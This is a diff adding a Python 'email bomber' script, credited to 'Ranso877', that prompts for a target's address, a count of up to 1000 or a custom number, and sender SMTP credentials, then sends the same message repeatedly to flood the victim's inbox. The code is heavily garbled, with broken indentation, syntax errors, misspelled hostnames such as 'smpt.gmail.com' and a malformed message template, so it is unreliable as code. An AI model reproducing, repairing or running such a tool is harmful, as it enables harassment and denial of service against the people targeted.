@@ -1,0 +1,116 @@
+
+from _typeshed import SliceableBuffer
+from re import error
+import smtplib
+import sys
+
+class bcolours:
+RED = '\033[91m'
+GREEN = '\033[92m'
+
+
+def banner():
+  print(bcolours.RED + ("""" 
+   / __ \/   |  / | / / ___// __ \( __ )__  /__  / ___/   / ____/  |/  /   |  /  _/ /  / __ )/ __ \/  |/  / __ )/ ____/ __ \
+  / /_/ / /| | /  |/ /\__ \/ / / / __  | / /  / /\__ \   / __/ / /|_/ / /| |  / // /  / __  / / / / /|_/ / __  / __/ / /_/ /
+ / _, _/ ___ |/ /|  /___/ / /_/ / /_/ / / /  / /___/ /  / /___/ /  / / ___ |_/ // /__/ /_/ / /_/ / /  / / /_/ / /___/ _, _/ 
+/_/ |_/_/  |_/_/ |_//____/\____/\____/ /_/  /_//____/  /_____/_/  /_/_/  |_/___/____//_____/\____//  /_/_____/_____/_/ |_|"""")
+
+
+
+        print("Made by Ranso877")
+
+
+
+
+      class_Bomber:
+        count = 0
+
+      def __init__(self)
+            try:
+        print(bcolours.GREEN + '\nLOADING...')
+        self.target = str(input(bcolours.RED + 'Enter Targets Email <: '))
+        self.mode = int(input(b.colours. RED + 'Enter B0MB MODE (1,2,3,4)  || 1:(1000) 2:(500) 3:(250 4:(Custom) <:  '))
+       if int(self.mode > int(4) or int(self.mode) < int(1):
+         print("ERROR Invalid Option Goodbye.")
+         sys.exit(1)
+  except Exception as e:
+ print(for'ERROR: {e}')
+
+
+def bomb(self:
+         try:
+  print(bcolours.GREEN + '\n Setting up Bomb')
+ self.amount = None
+if self.mode == int(1):
+ self.amount = int(1000)
+elif self.mode == int(2):
+self.amount = int(500)
+elif self.mode == int(3):
+     self.amount = int(250)
+else:
+    self.amount = int(input(bcolours.RED'Choose A Custom Amount <: '))
+        print(b.colours.GREEN + '\nYou have Selected Bomb Mode: {self.mode} and {self.amount} emails')
+ except Exception as e:
+print(for'ERROR: {e}')
+
+def email(self):
+  try:
+   print('(bcolours.GREEN + \nSetting Up Email')
+ self.server = str(input(b.colours.RED + 'Enter Email Server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: ))
+
+premade = ['1','2','3']
+
+default_port = True
+if self.server not in premade
+
+default_port = False
+self.port = int(input(bcolours.RED + 'Enter Port number <: '))
+
+if default_port = True:
+   self.port = int(587)
+
+if self.server == '1':
+   self.server = 'smpt.gmail.com'
+elif self.server == '2':
+  self.server = 'smpt.mail.yahoo.com'
+elif self.server == '3':
+    self.server = 'smpt-mail.outlook.com'
+
+self.fromAddr = str(input(bcolours.RED + 'Enter from address <: '))
+self.fromPwd = str(input(bcolours.RED + 'Enter from Password <: '))
+self.subject = str(input(bcolours.RED + 'Enter Subject <: '))
+self.message = str(input(bcolours.RED + 'Enter message <: '))
+
+self.msg = '''From: %s\nTo: %s\nSubject %s\n%\nonlocal
+''' % (self.fromAddr, self.target, self.subject, self.message)
+
+        self.s = smtplib.SMTP(self.server,self.port)
+                   self.s.ehlo()
+                   self.s.starttls
+                   self.s.elho()
+                   self.login(self.fromAddr, self.fromPwd)
+                   except Exception as e:
+                   print(format'ERROR: {e}')
+def send(self):
+  try:
+  self.s.sendmail(self.fromAddr, self.target, self.msg)
+    self.count +=1
+    print(bcolours.GREEN + f'BOMB: {self.count}')
+except Exception as e:
+  print('ERROR: {e}')
+
+def attack(self):
+  print(bcolours.RED + 'Atacking...')
+  for email in range(self.amount+1)
+  self.send()
+  self.s.close()
+  print (bcolours.GREEN + 'Attack Finshed')
+  sys.exit(0)
+
+if __name__=='__main__':
+
+  bomb = Bomber()
+  bomb.bomb()
+  bomb.email
+  bomb.attack()
